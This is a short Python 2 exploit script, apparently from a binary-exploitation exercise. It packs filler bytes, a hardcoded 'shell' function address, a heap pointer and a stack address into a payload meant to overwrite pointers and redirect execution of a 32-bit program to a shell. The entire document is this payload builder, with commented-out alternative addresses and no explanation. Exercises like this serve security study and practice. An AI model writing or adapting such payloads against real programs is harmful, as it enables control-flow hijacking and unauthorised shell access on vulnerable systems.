from struct import pack

pointer = 0x804b580 + 4
#pointer = 0xffffd0b4
# shell = 0x080484f4
stackAddress = 0xffffd0c8 - 4
shell = 0x080484eb
slide = "AAAABBBB" + pack("I", shell) + "A"*12

print slide + pack("I", pointer) + pack("I", stackAddress)
